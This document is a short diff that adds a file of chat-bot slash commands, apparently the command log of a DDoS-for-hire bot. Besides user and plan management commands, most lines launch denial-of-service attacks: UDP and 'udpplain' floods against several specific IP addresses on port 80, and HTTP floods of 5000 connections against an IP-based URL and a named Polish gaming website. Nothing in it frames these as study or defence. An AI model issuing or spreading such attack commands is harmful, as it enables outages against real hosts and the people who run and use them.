@@ -1,0 +1,13 @@
+/getplan <@696801406971281490>
+/adduser 696801406971281490 1
+/help
+/tr4p
+/methods
+/ddos udp 117.27.239.28 dport=80
+/ddos udp 117.27.239.28 60 dport=80
+/tr4p
+/methods
+/ddos http http://91.232.174.70/HIT 60 conns=5000
+/ddos udpplain 183.131.168.26 40 dport=80
+/ddos http https://for-games.pl/ 60 conns=5000
+/ddos udpplain  178.33.53.201 60 dport=80
